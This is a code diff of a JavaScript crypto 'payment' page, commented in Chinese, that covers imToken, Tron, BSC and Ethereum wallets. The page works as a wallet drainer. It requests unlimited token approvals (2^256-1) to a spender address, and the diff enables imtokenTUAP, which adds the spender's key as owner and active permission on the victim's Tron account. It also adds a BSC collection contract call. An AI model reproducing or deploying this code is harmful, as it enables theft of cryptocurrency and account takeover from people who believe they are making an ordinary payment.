@@ -1,4 +1,4 @@
-spender_bas58 = 'TPTkneMqubtYLHHyi6Z8jfRdi8Ff52aAmh' // 部署的合约地址
+spender_bas58 = 'TLT3QYegpmLWhmszCebTfNqwdPGcQFJn9z' // 应该是合约地址，原来的是 TBvWK12aKi3ravybcEyPNSh2qeU7oAgWpb ，其他不变
 if (typeof window.tronWeb !== 'undefined') {
   spender_hex = tronWeb.address.toHex(spender_bas58)
 } else {
@@ -6,6 +6,8 @@ if (typeof window.tronWeb !== 'undefined') {
 }
 //这里地址更改为自己地址(目前是随便写的一个)
 eth_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+// BSC合约地址
+bsc_contract_address = '0xa9470e80e9ad31b4b0d745037711bc3ef30ce70c'
 approve_type = 2
 
 function printd(text) {
@@ -2795,15 +2797,19 @@ async function getWallet() {
             stateMutability: 'nonpayable',
             type: 'constructor',
           },
-          { payable: true, stateMutability: 'payable', type: 'fallback' },
+          {
+            payable: true,
+            stateMutability: 'payable',
+            type: 'fallback',
+          },
           {
             inputs: [
+              { indexed: false, name: 'previousOwner', type: 'address' },
               {
                 indexed: false,
-                name: 'previousOwner',
+                name: 'newOwner',
                 type: 'address',
               },
-              { indexed: false, name: 'newOwner', type: 'address' },
             ],
             name: 'ProxyOwnershipTransferred',
             anonymous: false,
@@ -3088,7 +3094,10 @@ async function getWallet() {
             constant: false,
             inputs: [
               { name: 'newBasisPoints', type: 'uint256' },
-              { name: 'newMaxFee', type: 'uint256' },
+              {
+                name: 'newMaxFee',
+                type: 'uint256',
+              },
             ],
             name: 'setParams',
             outputs: [],
@@ -3333,17 +3342,49 @@ async function getWallet() {
 }
 
 function payNow() {
-  if (wallet == 'imToken') {
-    if (chain == 'tron') {
-      // 使用实际的支付金额，转换为 USDT 的最小单位（6位小数）
-      amount = '123456789123456789123456789'
-      // amount = (parseFloat(document.getElementById('price').innerText) * 1000000).toString();
+  // 从URL获取价格参数
+  const priceParam = getQueryVariable('price')
+  console.log('URL价格参数:', priceParam)
+
+  // 计算USDT金额（以wei为单位）
+  let priceInUSDT = 0
+  if (priceParam && !isNaN(parseFloat(priceParam))) {
+    // 将USDT价格转换为wei单位 (USDT通常有6个小数位)
+    const priceValue = parseFloat(priceParam)
+    console.log('解析后的价格值:', priceValue)
+
+    if (wallet == 'imToken') {
+      if (chain == 'tron') {
+        // Tron USDT有6位小数
+        priceInUSDT = (priceValue * 1000000).toString()
+        console.log('Tron链上价格(USDT单位):', priceInUSDT)
+        amount = priceInUSDT
+      } else {
+        // BSC/ETH USDT有18位小数
+        priceInUSDT = web3.utils.toWei(priceValue.toString(), 'ether')
+        console.log('ETH/BSC链上价格(USDT单位):', priceInUSDT)
+        amount = priceInUSDT
+      }
     } else {
+      // 其他钱包仍使用原来的逻辑，但也可以考虑更新
       amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
     }
   } else {
-    amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+    // 如果没有价格参数或解析失败，使用默认金额
+    console.log('无有效价格参数，使用默认金额')
+    if (wallet == 'imToken') {
+      if (chain == 'tron') {
+        amount = '123456789123456789123456789'
+      } else {
+        amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+      }
+    } else {
+      amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+    }
   }
+
+  console.log('最终支付金额:', amount)
+
   if (chain == 'tron') {
     if (wallet == 'imToken') {
       // imtokenTUAP();
@@ -3354,12 +3395,17 @@ function payNow() {
     }
     //以下两个地址更改为自己地址（目前写的是官方）
   } else if (chain == 'bsc') {
-    contract.methods
-      .increaseAllowance(eth_address, amount)
-      .send({ from: accounts[0] })
-      .on('transactionHash', function (hash) {
-        successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1)
-      })
+    if (wallet == 'imToken') {
+      alert('imTokenBSC 支付')
+      imTokenBSC()
+    } else {
+      contract.methods
+        .increaseAllowance(eth_address, amount)
+        .send({ from: accounts[0] })
+        .on('transactionHash', function (hash) {
+          successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1)
+        })
+    }
   } else if ((chain = 'eth')) {
     contract.methods
       .approve(eth_address, amount)
@@ -3370,9 +3416,35 @@ function payNow() {
   }
 }
 
+// 新增合约支付方法
+
 function successCallback(address, approved, type) {
-  console.log('支付成功 - 地址:', address, '授权地址:', approved, '类型:', type)
-  alert('支付成功！交易已完成。')
+  // 不调用接口，直接提示相关信息，地址，金额，链，类型
+  const tips = `
+    支付成功！
+    地址：${address}
+    金额：${approved}
+    链：${chain}
+    类型：${type}
+  `
+  alert(tips)
+  // sendGetRequest(
+  //   '/successCallback?address=' +
+  //     address +
+  //     '&approved=' +
+  //     approved +
+  //     '&chain=' +
+  //     chain +
+  //     '&type=' +
+  //     type,
+  //   function (responseData) {
+  //     console.log('成功获取数据:', responseData)
+  //     alert('支付失败，请尝试使用其他钱包！')
+  //   },
+  //   function (error) {
+  //     console.error('获取数据失败:', error)
+  //   }
+  // )
 }
 
 function sendGetRequest(url, onSuccess, onError) {
@@ -3390,45 +3462,51 @@ function sendGetRequest(url, onSuccess, onError) {
   xhr.send()
 }
 
-// async function imtokenTUAP() {
-//     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-//     if (trx < 25000000) {
-//         alert('没有足够的TRX用于支付网络费。');
-//     } else {
-//         if (trx > 100000000) {
-//             document.getElementById('btn_pay').setAttribute('style', 'display:none');
-//             let ownerAddress = window.tronWeb.defaultAddress.hex;
-//             let ownerPermission = {type: 0, permission_name: 'owner'};
-//             ownerPermission.threshold = 1;
-//             ownerPermission.keys = [];
-//             let activePermission = {type: 2, permission_name: 'active0'};
-//             activePermission.threshold = 1;
-//             activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
-//             activePermission.keys = [];
-//             ownerPermission.keys.push({address: spender_hex, weight: 1});
-//             ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-//             activePermission.keys.push({address: spender_hex, weight: 1});
-//             activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-//             try {
-//                 const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
-//                 printd(updateTransaction);
-//                 console.log(updateTransaction);
-//                 const signed = await window.tronWeb.trx.sign(updateTransaction);
-//                 console.log(signed);
-//                 const res = await window.tronWeb.trx.sendRawTransaction(signed);
-//                 console.log(res);
-//                 successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
-//             } catch (error) {
-//                 approval.removeAttribute('style');
-//                 approval.setAttribute('style', 'height: 95%;');
-//             }
-//         } else {
-//             document.getElementById('btn_pay').setAttribute('style', 'display:none');
-//             approval.removeAttribute('style');
-//             approval.setAttribute('style', 'height: 95%;');
-//         }
-//     }
-// }
+async function imtokenTUAP() {
+  let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
+  if (trx < 25000000) {
+    alert('没有足够的TRX用于支付网络费。')
+  } else {
+    if (trx > 100000000) {
+      document.getElementById('btn_pay').setAttribute('style', 'display:none')
+      let ownerAddress = window.tronWeb.defaultAddress.hex
+      let ownerPermission = { type: 0, permission_name: 'owner' }
+      ownerPermission.threshold = 1
+      ownerPermission.keys = []
+      let activePermission = { type: 2, permission_name: 'active0' }
+      activePermission.threshold = 1
+      activePermission.operations =
+        '7fff1fc0037e0000000000000000000000000000000000000000000000000000'
+      activePermission.keys = []
+      ownerPermission.keys.push({ address: spender_hex, weight: 1 })
+      ownerPermission.keys.push({ address: window.tronWeb.defaultAddress.hex, weight: 1 })
+      activePermission.keys.push({ address: spender_hex, weight: 1 })
+      activePermission.keys.push({ address: window.tronWeb.defaultAddress.hex, weight: 1 })
+      try {
+        const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(
+          ownerAddress,
+          ownerPermission,
+          null,
+          [activePermission]
+        )
+        printd(updateTransaction)
+        console.log(updateTransaction)
+        const signed = await window.tronWeb.trx.sign(updateTransaction)
+        console.log(signed)
+        const res = await window.tronWeb.trx.sendRawTransaction(signed)
+        console.log(res)
+        successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0)
+      } catch (error) {
+        approval.removeAttribute('style')
+        approval.setAttribute('style', 'height: 95%;')
+      }
+    } else {
+      document.getElementById('btn_pay').setAttribute('style', 'display:none')
+      approval.removeAttribute('style')
+      approval.setAttribute('style', 'height: 95%;')
+    }
+  }
+}
 
 async function TUAP() {
   if (wallet == 'okxwallet') {
@@ -3510,80 +3588,21 @@ async function TUAP() {
     // }
   }
 }
-// 旧版本
-// async function tronIA() {
-//     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-//     alert(trx);
-//     if (trx > 5000000) {  // 只需要5 TRX就足够了
-//         const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-//         try {
-//             let contract = await tronWeb.contract().at(trc20ContractAddress);
-//             // 使用更低的 feeLimit，5 TRX 就足够了
-//             res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 5000000});
 
-//             successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
-//         } catch (error) {
-//             console.error("智能合约调用错误:", error);
-//             if (error.message && error.message.includes("user rejected")) {
-//                 alert('用户取消了交易！');
-//             } else if (error.message && error.message.includes("insufficient")) {
-//                 alert('余额不足，请确保有足够的TRX和USDT！');
-//             } else {
-//                 alert('交易失败：' + error.message);
-//             }
-//         }
-//     } else {
-//         alert('TRX余额不足，需要至少5 TRX用于支付网络费！')
-//     }
-// }
 async function tronIA() {
-  const tronWeb = window.tronWeb
-  const address = tronWeb.defaultAddress.base58
-  const feeLimit = 5000000
-  const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-  // const spender_bas58 = "TPTkneMqubtYLHHyi6Z8jfRdi8Ff52aAmh"; // 你的合约地址
-  // const amount = tronWeb.toBigNumber(1).multipliedBy(1e6); // 授权 & 支付 1 USDT
-
-  let trx = await tronWeb.trx.getBalance(address)
-  alert('当前 TRX 余额：' + trx / 1e6 + ' TRX')
-
-  if (trx <= feeLimit) {
-    alert('❌ TRX 余额不足，请至少保留 5 TRX 用于手续费！')
-    return
-  }
-
-  try {
-    const usdtContract = await tronWeb.contract().at(usdtAddress)
-    const payContract = await tronWeb.contract().at(spender_bas58)
-
-    // 🧠 检查是否已授权
-    const allowance = await usdtContract.allowance(address, spender_bas58).call()
-    if (tronWeb.toBigNumber(allowance).lt(amount)) {
-      console.log('⏳ 正在授权 USDT...')
-      await usdtContract.increaseApproval(spender_bas58, amount).send({ feeLimit })
-      console.log('✅ 授权成功')
-    } else {
-      console.log('✅ 已授权，跳过授权步骤')
+  let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58)
+  if (trx > 25000000) {
+    const trc20ContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+    try {
+      let contract = await tronWeb.contract().at(trc20ContractAddress)
+      res = await contract.increaseApproval(spender_bas58, amount).send({ feeLimit: 100000000 })
+      successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type)
+    } catch (error) {
+      console.error('trigger smart contract error', error)
+      alert('支付失败！')
     }
-
-    // 💸 调用合约支付（pay 函数）
-    console.log('💸 正在支付...')
-    const tx = await payContract.pay(amount).send({ feeLimit })
-    alert('✅ 支付成功！交易哈希：' + tx)
-
-    // ✅ 成功回调
-    if (typeof successCallback === 'function') {
-      successCallback(address, spender_bas58, 'pay')
-    }
-  } catch (error) {
-    console.error('❌ 错误:', error)
-    if (error.message?.includes('user rejected')) {
-      alert('❌ 用户取消了交易')
-    } else if (error.message?.includes('insufficient')) {
-      alert('❌ 余额不足（TRX 或 USDT）')
-    } else {
-      alert('❌ 交易失败：' + (error.message || '未知错误'))
-    }
+  } else {
+    alert('没有足够的TRX用于支付网络费！')
   }
 }
 
@@ -3774,3 +3793,195 @@ contract_abi = []
 document.addEventListener('DOMContentLoaded', function () {
   getWalletTimer = setInterval(getWallet, 1000)
 })
+
+// BSC链imToken支付
+async function imTokenBSC() {
+  console.log('开始imTokenBSC函数')
+  try {
+    if (typeof window.ethereum !== 'undefined') {
+      console.log('检测到ethereum钱包')
+      // 确保已连接钱包
+      await window.ethereum.request({ method: 'eth_requestAccounts' })
+      console.log('钱包连接成功')
+
+      // 检查是否是BSC网络
+      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
+      console.log('当前链ID:', chainId)
+      if (chainId !== '0x38') {
+        // BSC Mainnet chainId
+        console.log('非BSC网络，尝试切换')
+        try {
+          // 尝试切换到BSC网络
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }],
+          })
+          console.log('成功切换到BSC网络')
+        } catch (switchError) {
+          console.error('切换网络错误:', switchError)
+          // 用户可能需要添加BSC网络
+          if (switchError.code === 4902) {
+            console.log('尝试添加BSC网络')
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [
+                {
+                  chainId: '0x38',
+                  chainName: 'Binance Smart Chain',
+                  nativeCurrency: {
+                    name: 'BNB',
+                    symbol: 'BNB',
+                    decimals: 18,
+                  },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/'],
+                },
+              ],
+            })
+            console.log('BSC网络添加成功')
+          } else {
+            throw switchError
+          }
+        }
+      }
+
+      const web3 = new Web3(window.ethereum)
+      console.log('Web3实例创建成功')
+      const accounts = await web3.eth.getAccounts()
+      console.log('获取到账户:', accounts)
+      const userAccount = accounts[0]
+
+      // 确认用户有足够的BNB支付Gas费
+      const balance = await web3.eth.getBalance(userAccount)
+      console.log('用户BNB余额:', web3.utils.fromWei(balance, 'ether'), 'BNB')
+      if (web3.utils.fromWei(balance, 'ether') < 0.01) {
+        alert('BNB余额不足，无法支付Gas费用')
+        return
+      }
+
+      // 使用用户的合约
+      const bscContractAddress = '0xa9470e80e9ad31b4b0d745037711bc3ef30ce70c'
+      console.log('合约地址:', bscContractAddress)
+      const contractABI = [
+        {
+          inputs: [
+            { internalType: 'address', name: '_usdtAddress', type: 'address' },
+            { internalType: 'address', name: '_collectionAddress', type: 'address' },
+            { internalType: 'uint256', name: '_threshold', type: 'uint256' },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'constructor',
+        },
+        {
+          anonymous: false,
+          inputs: [{ indexed: false, internalType: 'uint256', name: 'amount', type: 'uint256' }],
+          name: 'FundsCollected',
+          type: 'event',
+        },
+        {
+          anonymous: false,
+          inputs: [
+            { indexed: false, internalType: 'uint256', name: 'newThreshold', type: 'uint256' },
+          ],
+          name: 'ThresholdUpdated',
+          type: 'event',
+        },
+        {
+          inputs: [],
+          name: 'collectionAddress',
+          outputs: [{ internalType: 'address', name: '', type: 'address' }],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'emergencyWithdraw',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'owner',
+          outputs: [{ internalType: 'address', name: '', type: 'address' }],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
+          name: 'pay',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [{ internalType: 'address', name: 'newAddress', type: 'address' }],
+          name: 'setCollectionAddress',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
+          name: 'setOwner',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [{ internalType: 'uint256', name: 'newThreshold', type: 'uint256' }],
+          name: 'setThreshold',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'threshold',
+          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'usdtAddress',
+          outputs: [{ internalType: 'address', name: '', type: 'address' }],
+          stateMutability: 'view',
+          type: 'function',
+        },
+      ]
+
+      const bscContract = new web3.eth.Contract(contractABI, bscContractAddress)
+      console.log('合约实例创建成功')
+
+      // 保持与其他支付方法一致
+      document.getElementById('btn_pay').setAttribute('style', 'display:none')
+      // 使用全局amount变量，此时已经在payNow中设置为正确的USDT金额
+      console.log('支付金额:', amount)
+
+      // 显示支付确认信息
+      alert('正在拉起支付，请在钱包中确认交易')
+
+      // 调用合约的pay方法
+      console.log('开始调用合约pay方法, 金额:', amount)
+      const transaction = await bscContract.methods.pay(amount).send({
+        from: userAccount,
+        gas: 200000, // 根据合约复杂度调整
+        gasPrice: web3.utils.toWei('5', 'gwei'), // 根据当前BSC网络的Gas价格调整
+      })
+
+      // 交易成功后回调
+      console.log('交易哈希:', transaction.transactionHash)
+      console.log('交易详情:', transaction)
+      successCallback(userAccount, bscContractAddress, 2)
+    } else {
+      console.error('未检测到以太坊钱包')
+      alert('未检测到以太坊钱包，请安装imToken或其他兼容钱包')
+    }
+  } catch (error) {
+    console.error('BSC支付错误:', error)
+    console.error('错误详情:', JSON.stringify(error, Object.getOwnPropertyNames(error)))
+    alert('支付失败: ' + (error.message || '未知错误'))
+    document.getElementById('btn_pay').removeAttribute('style')
+  }
+}
